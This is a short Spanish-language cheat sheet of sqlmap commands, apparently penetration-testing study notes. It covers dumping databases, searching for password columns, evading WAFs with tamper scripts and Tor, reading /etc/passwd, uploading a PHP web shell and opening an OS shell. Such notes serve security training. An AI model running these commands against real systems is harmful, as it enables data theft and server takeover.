# Dumping DTBs
sqlmap -u [URL] --forms --batch --dbs
(Por ejemplo sale que tiene la tabla users)

sqlmap -u [URL] --forms --batch -D users --tables
(Tabla usuarios)

sqlmap -u [URL] --forms --batch -D users -T usuarios --dump

--risk 3 --level 5
(Para hacerlo mas efectivo)

--technique=BEU
Para especificar tecnicas, esta por ejemplo se salta la de time based

--code=200
para que vaya filtrando si el objetivo es muy grande por ese estado

--string=success
Lo mismo pero con cadena

--union-cols=X
Enumera primero el numero de columnas con --columns

-C name,surname
Para las columnas

--start=2 --stop=3
Para empezar en un ID y terminar en otro

# DTBs enumeration

```
sqlmap -u [URL] --banner --current-user --current-db --is-dba
```

--schema
Para tirar todo el schema

--search -T user
Para buscar tablas con user

--search -C pass
Para buscar columans con pass

--where="name LIKE 'f%'"
Para elegir un nombre de la base de datos que empieze por f 
# Bypassing WAFs

--no-cast
!!INTERESANTE!! no usa data casting en los payloads y evade WAFs

--csrf-token="csrf-token"
Para un token CSRF implementado en la pagina

--csrf-token="t0ken"
Ejemplo de variable en vez del valor

--randomize=uid
(uid seria por ejemplo un valor en la URL)

--eval="import hashlib; h=hashlib.md5(id).hexdigest()"

--random-agent

--skip-waf

--tor

--chunked

--random-agent --skip-waf --tamper=between.py   
Combo muy bueno!!
## Tampering
--list-tampers
Para ver todos los disponibles

--tamper [Nombre]
Para usarlo

# OS exploitation
```
--is-dba
```
Para ver si tenemos privilegios

```
--file-read "/etc/passwd"
```
Para leer archivos

```
--file-write "shell.php"
```
Para subir archivos Y verificamos :
```
curl http://www.example.com/shell.php?cmd=ls+-la
```

```
--os-shell
```
Para abrir una shell en el sistema, pero si al meter un comando nos sale No ouput:
```
--os-shell --technique=E
```

